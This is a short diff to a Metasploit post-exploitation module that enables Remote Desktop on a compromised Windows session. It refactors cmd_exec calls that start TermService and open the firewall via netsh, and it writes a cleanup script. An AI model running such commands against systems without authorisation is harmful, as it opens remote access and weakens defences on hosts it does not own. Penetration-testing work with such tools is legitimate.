@@ -48,6 +48,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
+		
 		if datastore['ENABLE'] or (datastore['USERNAME'] and datastore['PASSWORD'])
 			cleanup_rc = store_loot("host.windows.cleanup.enable_rdp", "text/plain", session,"" ,
 						"enable_rdp_cleanup.rc", "enable_rdp cleanup resource file")
@@ -95,7 +96,7 @@ class Metasploit3 < Msf::Post
 				print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
 				service_change_startup("TermService","auto")
 				file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
-				cmd_exec("sc start termservice")
+				cmd_exec("sc", "start termservice", 30)
 				file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
 
 			else
@@ -103,7 +104,7 @@ class Metasploit3 < Msf::Post
 			end
 			#Enabling Exception on the Firewall
 			print_status "\tOpening port in local firewall if necessary"
-			cmd_exec('netsh firewall set service type = remotedesktop mode = enable')
+			cmd_exec('netsh', 'firewall set service type = remotedesktop mode = enable', 30)
 			file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c 'netsh firewall set service type = remotedesktop mode = enable'\"")
 		rescue::Exception => e
 			print_status("The following Error was encountered: #{e.class} #{e}")
